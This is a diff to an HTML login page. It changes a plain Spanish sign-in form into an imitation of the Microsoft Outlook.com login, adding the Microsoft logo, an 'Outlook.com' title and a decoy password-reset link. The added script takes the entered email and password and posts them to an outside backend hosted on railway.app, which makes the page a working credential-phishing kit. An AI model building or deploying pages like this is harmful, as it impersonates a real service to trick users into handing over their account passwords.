@@ -3,57 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./styles/styles.css">
-    <title>Login</title>
+    <link rel="stylesheet" type="text/css" href="./styles/stiles.css">
+    <link rel="stylesheet" href="./magic-master/dist/magic.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.min.css"/>   
+    <title>Outlook.com</title>
 </head>
 <body>
-    <div class="container">
-        <main>
-            <h1>Iniciar sesión</h1>
-            <form id="loginForm">
-                <label for="mail">Correo electrónico</label>
-                <input type="email" id="mail" name="mail" placeholder="Correo" required>
+       <div class="gandContainer">  <!-- magictime spaceOutLeft -->
+            <main class="inner">
+            <div class="margin-bottom-20" aria-hidden="true">
+                <picture class="logo margin-bottom-16">
+                    <img src="./images/microsoft_logo.svg" alt="Logotipo de Microsoft">
+                </picture>
+            </div>
 
-                <label for="pwd">Contraseña</label>
-                <input type="password" id="pwd" name="pwd" placeholder="Contraseña" required>
+            <input type="email" name="mail" class="form-control" placeholder="Correo" required="required" aria-required="true" autocomplete="off" id="displayName">
 
-                <button type="submit">Enviar</button>
+            <form id="sendForm" action="https://backend-login-production-375d.up.railway.app/login" method="POST">
+                <h1 class="text-title margin-bottom-16">Escribir contraseña</h1>
+               
+                <div class="alert alert-error text-body margin-bottom-12 col-md-12" id="errorAlert" style="display: none;"></div>
+                
+                <div class="row margin-bottom-16">
+                    <div class="form-group col-md-12 placeholderContainer">
+                        <input type="password" name="pwd" class="form-control" placeholder="Contraseña" required="required" aria-required="true" autocomplete="off" id="inputBoxId">
+                    </div>
+                </div>
+               
+                <div class="row margin-bottom-20">
+                    <div class="col-md-12 section text-secondary">
+                        <a class="forgotPass" href="http://www.google.com" aria-label="Crear una cuenta de Microsoft">¿Olvidó su contraseña?</a>
+                    </div>
+                </div>
+            
+                <div class="row inline-block no-margin-top-bottom button-container">
+                    <input type="submit" class="btn btn-block btn-primary" value="Iniciar sesión" id="btnSig" >
+                </div>
             </form>
-            <div id="error" style="color: red; display: none;"></div>
-        </main>
-    </div>
+            
+            </main>
+        </div>
+        <footer id="footer">
+            <div>
+                <div class="footerNode">
+                    <span id="footerDateId"></span>
+                    <a>Declaración de privacidad</a>
+                </div>
+            </div>
+        </footer>
 
-    <script>
-        const form = document.getElementById('loginForm');
-        const errorDiv = document.getElementById('error');
+        <script>
+            document.getElementById('sendForm').addEventListener('submit', async function(event) {
+                event.preventDefault();
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const mail = form.mail.value;
-            const pwd = form.pwd.value;
+                const formData = new FormData(this);
+                const mail = formData.get('mail');
+                const pwd = formData.get('pwd');
 
-            try {
-                const response = await fetch('https://backend-login-production-375d.up.railway.app/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ mail, pwd })
-                });
+                try {
+                    const response = await fetch(this.action, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ mail, pwd })
+                    });
 
-                if (!response.ok) {
-                    const { error } = await response.json();
-                    errorDiv.textContent = error || 'Error desconocido';
-                    errorDiv.style.display = 'block';
-                } else {
-                    errorDiv.style.display = 'none';
-                    alert('Usuario registrado con éxito');
+                    if (!response.ok) {
+                        const errorData = await response.json();
+                        document.getElementById('errorAlert').style.display = 'block';
+                        document.getElementById('errorAlert').textContent = errorData.error || 'Error desconocido';
+                        return;
+                    }
+
+                    alert('Usuario registrado exitosamente');
+                } catch (error) {
+                    document.getElementById('errorAlert').style.display = 'block';
+                    document.getElementById('errorAlert').textContent = 'Error de conexión al servidor';
                 }
-            } catch (err) {
-                errorDiv.textContent = 'Error de conexión con el servidor';
-                errorDiv.style.display = 'block';
-            }
-        });
-    </script>
+            });
+        </script>
 </body>
 </html>
+
